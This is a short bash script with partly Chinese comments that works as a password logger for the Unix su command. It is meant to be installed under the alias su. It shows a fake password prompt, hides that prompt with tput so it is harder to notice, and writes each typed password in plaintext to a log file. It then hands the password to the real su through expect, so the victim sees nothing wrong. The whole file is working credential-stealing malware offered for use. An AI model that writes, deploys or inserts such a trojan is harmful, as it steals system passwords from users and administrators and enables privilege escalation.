#!/bin/bash -
#simple su's password logger
#need expect
#usage:
#alias su='the_path_of_this_file'
#灵感来于
#http://www.91ri.org/8680.html
#自己加了tput部分，让其更隐弊，来自：
#http://www.ibm.com/developerworks/cn/aix/library/au-learningtput/
#by needle wang
#2014年 07月 15日 星期二 01:40:43 CST

#important!
LANG=en 

logfile='ha_su.log'

#将光标上移一行，让su的提示清除read的提示
tput sc
read -p 'Password:' -s pd
tput rc

echo "[$(date '+%Y-%m-%d %H:%M:%S')]: <args>$@</args> <pass>${pd}</pass>" >>"${logfile}"

expect -c "
spawn -noecho su $@
expect \"*assword:*\"
send \"${pd}\r\"
interact
"

